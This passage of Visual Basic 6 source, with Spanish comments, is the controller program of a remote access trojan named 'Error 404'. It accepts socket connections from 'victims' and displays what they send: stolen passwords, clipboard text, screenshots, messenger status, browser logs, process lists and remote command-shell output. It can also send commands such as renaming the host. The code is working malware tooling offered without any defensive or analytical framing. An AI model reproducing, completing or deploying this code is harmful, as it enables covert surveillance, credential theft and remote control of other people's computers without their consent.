    Call SetLayeredWindowAttributes(hwnd, 0, (255 * pet) / 100, LWA_ALPHA)
Case "mnuConfig1"
    fraConfig.Top = 2181
    If Me.Height = 3450 Then IDF = ""
    Me.Height = Me.Height + 99
    'Me.Height(Load) = 2856
Case "mnuConfig0"
        If Me.Height = 2955 Then
            IDF = ""
            fraConfig.Visible = False
        End If
    Me.Height = Me.Height - 99
    fraConfig.Top = 2400
Case "mnuBuild1"
    If fraBuild.Top = -250 Then IDF = ""
    fraBuild.Top = fraBuild.Top + 250
Case "mnuBuild0"
        If fraBuild.Top = -1750 Then
            IDF = ""
            fraBuild.Visible = False
        End If
    fraBuild.Top = fraBuild.Top - 250
Case "mnuStats1"
    If fraStats.Top = -250 Then IDF = ""
    fraStats.Top = fraStats.Top + 250
Case "mnuStats0"
        If fraStats.Top = -1750 Then
            IDF = ""
            fraStats.Visible = False
        End If
    fraStats.Top = fraStats.Top - 250
Case "mnuLog1"
    fraLog.Top = 2160
    If Me.Height = 4455 Then IDF = ""
    Me.Height = Me.Height + 123
Case "mnuLog0"
        If Me.Height = 2979 Then
            IDF = ""
            fraLog.Visible = False
            fraLog.Top = 2400
        End If
    Me.Height = Me.Height - 123
End Select

End Sub

Private Sub tmrGeneral_Timer()
Dim vIndex As Variant
Dim v As Long
On Error Resume Next
For v = 0 To LV.ListItems.Count

vIndex = Split(LV.ListItems(v).key, "|")
If sckMain(vIndex(0)).State <> 7 Then
LV.ListItems.Remove (v)
End If
Next
'<//Caption,Formulario Principal_
    If LV.ListItems.Count = 1 Then Me.Caption = "Error 404 - [" & LV.ListItems.Count & " Victima Conectada] Index = " & TotalIndex
    If LV.ListItems.Count > 1 Then Me.Caption = "Error 404 - [" & LV.ListItems.Count & " Victimas Conectadas] Index = " & TotalIndex
    If LV.ListItems.Count = 0 Then Me.Caption = "Error 404 - [" & "No hay victimas conectadas] Index = " & TotalIndex
    '//>


End Sub

Private Sub sckMain_ConnectionRequest(Index As Integer, ByVal requestID As Long)
On Error Resume Next
TotalIndex = TotalIndex + 1
sckMain(Index).Close
sckMain(Index).Accept requestID
Load sckMain(TotalIndex)
sckMain(TotalIndex).Listen
End Sub
Private Sub LV_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
On Error Resume Next
If LV.SelectedItem.Selected = False Then
Exit Sub
ElseIf Button = 2 Then
PopupMenu mnu
End If
End Sub

Private Sub sckMain_DataArrival(Index As Integer, ByVal bytesTotal As Long)
Dim datos As String
Dim data() As String
sckMain(Index).GetData datos
data = Split(datos, "|")
Select Case data(0)

'<//Conexion_ [******************************************************************************************************]
Case "Connect"
    Dim x As ListItem
    Set x = LV.ListItems.Add(, Index & "|", data(1), 1, 1)
    x.SubItems(1) = sckMain(Index).RemoteHostIP
    x.SubItems(2) = data(6)
    x.SubItems(3) = data(2)
    x.SubItems(4) = data(5)
    x.SubItems(5) = data(4) & " MB"
    x.SubItems(6) = data(3)
    If data(1) = "Victima" Then frmNotify.lblConnectionName.Caption = sckMain(Index).RemoteHostIP Else _
    frmNotify.lblConnectionName.Caption = data(1)
    frmNotify.Visible = True
    frmNotify.Timer1.Enabled = True
'Conexion//>

'<//Informacion_ [******************************************************************************************************]
Case "ChangeHost"
    MsgBox "El nombre del equipo se ha cambiado correctamente" & vbCrLf & "Nombre del Equipo actual: " & data(1), vbInformation, "Error 404"
Case "infor"
    frmInfo.LV.ListItems(9).SubItems(1) = data(5)
    frmInfo.LV.ListItems(9).SubItems(1) = data(1)
    frmInfo.LV.ListItems(16).SubItems(1) = data(2)
    frmInfo.LV.ListItems(17).SubItems(1) = data(3)
    frmInfo.LV.ListItems(13).SubItems(1) = data(4)
    frmInfo.LV.ListItems(4).SubItems(1) = data(5)
    frmInfo.LV.ListItems(14).SubItems(1) = data(6)
    frmInfo.LV.ListItems(6).SubItems(1) = data(7)
    frmInfo.LV.ListItems(7).SubItems(1) = data(8)
    frmInfo.LV.ListItems(11).SubItems(1) = data(9)
    frmInfo.LV.ListItems(8).SubItems(1) = data(10)
    frmInfo.LV.ListItems(15).SubItems(1) = data(6) & "\system32"
        If data(12) = "" Then
            frmInfo.LV.ListItems(17).SubItems(1) = "Not Found!"
        Else
            frmInfo.LV.ListItems(17).SubItems(1) = data(12)
        End If
'Informacion//>

'<//Portapapeles_ [******************************************************************************************************]
Case "cliptext":
    If data(1) = "" Then
        frmClipboard.lblState.Caption = "Portapapeles Vacio"
        frmClipboard.txtClipboard.Text = ""
    Else
        frmClipboard.lblState.Caption = "Ultima Modificacion: " & Time
        frmClipboard.txtClipboard.Text = data(1)
    End If
'Portapapeles//>

'<//Messenger_ [******************************************************************************************************]
Case "LoadMSN"
    frmMSN.lblCE.Caption = data(1)
    frmMSN.cboStatus.Text = data(2)
'Messenger//>

'<//Contraseñas_ [******************************************************************************************************]
Case "ShowPass"
    frmPass.LV.ListItems.Clear
    Dim I As ListItem
    Set I = frmPass.LV.ListItems.Add(, , data(1), 1, 1)
    I.ListSubItems.Add 1, , data(2)
    I.ListSubItems.Add 2, , data(3)
'Contraseñas//>

'<//Chat_ [******************************************************************************************************]
Case "msgChat"
    frmChat.txtLog.Text = frmChat.txtLog.Text & data(1)
Case "ServerClose"
    frmChat.txtLog.Text = frmChat.txtLog.Text & vbCrLf & vbCrLf & "(El servidor ha intentado cerrar el chat)"
'Chat//>

'<//Screen Shot_ [******************************************************************************************************]
Case "shotScreen"
    frmScreenShot.PictureShot.Picture = data(1)
'Screen Shot//>

'<//Opciones de Internet_ [******************************************************************************************************]
Case "HomeWeb"
    frmNETOptions.txtHomeWeb.Text = data(1)
Case "WebLog"
    frmNETOptions.txtLog.Text = data(1)
'Opciones de Internet//>

'<//Impresora_ [******************************************************************************************************]
Case "PrintFinish"
    MsgBox "El texto se ha imprimido correctamente", vbInformation, "Error 404"
'Impresora//>

'<//Procesos_ [******************************************************************************************************]
Case "Process"
    Dim P    As Long
    For P = 1 To UBound(data)
    If Not (data(P)) = "" Then
    frmProcess.LV.ListItems.Add , , data(P)
    End If
    Next P
'Procesos//>

'<//Shell_ [******************************************************************************************************]
Case "sCommand"
    frmShell.txtLog.Text = frmShell.txtLog.Text & vbCrLf & data(1) & vbCrLf & "C:\Documents and Settings\" & data(2) & ">"
'Shell//>

'<//Ping_ [******************************************************************************************************]
Case "GetPing"
    frmPing.txtLog.Text = data(1)
Case "GetTracert"
    frmPing.txtLog.Text = data(1)
'Ping//>

End Select
End Sub

Private Sub lv_AfterLabelEdit(Cancel As Integer, NewString As String)
Send "ChangeName|" & NewString
End Sub


Private Sub txtConfigPass_Change()
mnuSaveConfig.Visible = True
End Sub

Private Sub txtConfigPort_Change()
mnuSaveConfig.Visible = True
End Sub
